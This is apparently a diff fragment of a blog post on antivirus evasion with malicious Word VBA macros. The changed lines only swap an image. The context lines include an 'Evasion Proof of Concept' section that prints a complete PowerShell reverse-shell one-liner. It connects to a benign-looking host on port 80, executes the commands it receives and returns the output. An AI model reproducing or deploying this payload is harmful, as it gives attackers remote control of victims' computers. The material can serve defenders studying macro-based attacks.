@@ -24,7 +24,7 @@ A Word document VBA macro is a script embedded within a Word document that uses 
 In the context of Word document macros, a malicious macro might attempt to establish this reverse shell connection, allowing an attacker to control the compromised system remotely. This is often used as part of cyberattacks to gain unauthorized access or control over a victim's computer.
 
 # Evasion Proof of Concept {#section-3}
-<img src="/assets/AV/Final.gif" width="1500" height="1500"/>
+<img src="/assets/AV/FinalMacro.gif" width="2000" height="1500"/>
 Below are the steps:
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient('legitwebsite.com',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
